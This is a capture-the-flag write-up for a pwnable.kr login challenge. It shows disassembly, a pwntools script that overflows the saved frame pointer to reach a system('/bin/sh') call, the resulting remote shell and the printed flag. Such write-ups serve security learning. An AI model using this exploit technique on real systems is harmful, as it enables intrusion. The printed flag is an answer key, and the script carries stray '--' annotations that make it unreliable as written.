### After downading the binary 
```
Authenticate : aaaaaaaaaaaaaaaa --breaks here 
hash : d3fb4db842861ccc2775253c86899b42
Segmentation fault (core dumped)
````
Next I opened it up to have a little look at it decompiled



rodata:080DA684 aF87cd601aa7fed db 'f87cd601aa7fedca99018a8be88eda34',0 ---- from auth in wine ida 
.rodata:080DA684                                         ; DATA XREF: auth+53↑o
.rodata:080DA6A5 aAuthenticate   db 'Authenticate : ',0  ; DATA XREF: main+6F↑o
.rodata:080DA6B5 a30s            db '%30s',0             ; DATA XREF: main+83↑o
.rodata:080DA6BA aWrongLength    db 'Wrong Length',0     ; DATA XREF: main:loc_8049413↑o
.rodata:080DA6C7                 align 4
.rodata:080DA6C8 dbl_80DA6C8     dq 3.0                  ; DATA XREF: Base64Encode+1F↑r
.rodata:080DA6D0 dbl_80DA6D0     dq 4.0                  ; DATA XREF: Base64Encode+2F↑r
.rodata:080DA6D8 dbl_80DA6D8     dq 0.75                 ; DATA XREF: calcDecodeLength+64↑r

----auth --
ump of assembler code for function auth:
   0x0804929c <+0>:	push   %ebp
   0x0804929d <+1>:	mov    %esp,%ebp
   0x0804929f <+3>:	sub    $0x28,%esp
   0x080492a2 <+6>:	mov    0x8(%ebp),%eax
   0x080492a5 <+9>:	mov    %eax,0x8(%esp)
   0x080492a9 <+13>:	movl   $0x811eb40,0x4(%esp) --imput address we need 
   0x080492b1 <+21>:	lea    -0x14(%ebp),%eax
   0x080492b4 <+24>:	add    $0xc,%eax
   0x080492b7 <+27>:	mov    %eax,(%esp)
   0x080492ba <+30>:	call   0x8069660 <memcpy>
   0x080492bf <+35>:	movl   $0xc,0x4(%esp)
   0x080492c7 <+43>:	lea    -0x14(%ebp),%eax
   0x080492ca <+46>:	mov    %eax,(%esp)
   0x080492cd <+49>:	call   0x8049188 <calc_md5>
   0x080492d2 <+54>:	mov    %eax,-0xc(%ebp)
   0x080492d5 <+57>:	mov    -0xc(%ebp),%eax
   0x080492d8 <+60>:	mov    %eax,0x4(%esp)
   0x080492dc <+64>:	movl   $0x80da677,(%esp)
   0x080492e3 <+71>:	call   0x805b630 <printf>
   0x080492e8 <+76>:	mov    -0xc(%ebp),%eax
   0x080492eb <+79>:	mov    %eax,0x4(%esp)
   0x080492ef <+83>:	movl   $0x80da684,(%esp)
   0x080492f6 <+90>:	call   0x80482f0
   0x080492fb <+95>:	test   %eax,%eax
   0x080492fd <+97>:	jne    0x8049306 <auth+106>
   0x080492ff <+99>:	mov    $0x1,%eax
   0x08049304 <+104>:	jmp    0x804930b <auth+111>
   0x08049306 <+106>:	mov    $0x0,%eax
   0x0804930b <+111>:	leave  
   0x0804930c <+112>:	ret    
--------


----correct-----
 Attributes: noreturn bp-based frame
.text:0804925F
.text:0804925F                 public correct
.text:0804925F correct         proc near               ; CODE XREF: main+FF↓p
.text:0804925F
.text:0804925F var_C           = dword ptr -0Ch
.text:0804925F
.text:0804925F                 push    ebp
.text:08049260                 mov     ebp, esp
.text:08049262                 sub     esp, 28h
.text:08049265                 mov     [ebp+var_C], offset input
.text:0804926C                 mov     eax, [ebp+var_C]
.text:0804926F                 mov     eax, [eax]
.text:08049271                 cmp     eax, 0DEADBEEFh
.text:08049276                 jnz     short loc_8049290
.text:08049278                 mov     dword ptr [esp], offset aCongratulation ; "Congratulation! you are good!" - here 
.text:0804927F                 call    puts
.text:08049284                 mov     dword ptr [esp], offset aBinSh ; "/bin/sh" --shell address we need :)
.text:0804928B                 call    system
.text:08049290
.text:08049290 loc_8049290:                            ; CODE XREF: correct+17↑j
.text:08049290                 mov     dword ptr [esp], 0
.text:08049297                 call    exit
.text:08049297 correct         endp
.text:08049297


---

gdb correct 

(gdb) disassemble correct
Dump of assembler code for function correct:
   0x0804925f <+0>:	push   %ebp
   0x08049260 <+1>:	mov    %esp,%ebp
   0x08049262 <+3>:	sub    $0x28,%esp
   0x08049265 <+6>:	movl   $0x811eb40,-0xc(%ebp)
   0x0804926c <+13>:	mov    -0xc(%ebp),%eax
   0x0804926f <+16>:	mov    (%eax),%eax
   0x08049271 <+18>:	cmp    $0xdeadbeef,%eax
   0x08049276 <+23>:	jne    0x8049290 <correct+49>
   0x08049278 <+25>:	movl   $0x80da651,(%esp) 
   0x0804927f <+32>:	call   0x805c2d0 <puts> --here 
   0x08049284 <+37>:	movl   $0x80da66f,(%esp)
   0x0804928b <+44>:	call   0x805b2b0 <system>
   0x08049290 <+49>:	movl   $0x0,(%esp)
   0x08049297 <+56>:	call   0x805a6a0 <exit>

----

```

To exploit this. We need to overwtite the correct functon value 0x08049278. we need to control the EIP(hopefully) time to ovrfloe this. we need to oveflow the EBP and chnge the stack. 
```
from pwn import *
import base64
p = remote('pwnable.kr',9003)
p.recvuntil('Authenticate : ')
payload = ''
shell_addr = 0x8049284 --
input_addr = 0x811EB40
payload = flat('aaaa',shell_addr,input_addr)
payload = base64.b64encode(payload)
p.sendline(payload)
p.recvline()
p.interactive()
```
Opening connection to pwnable.kr on port 9003: Done
[*] Switching to interactive mode
$ ls
flag
log
simplelogin
super.pl
$ cat flag
control EBP, control ESP, control EIP, control the world~
$  



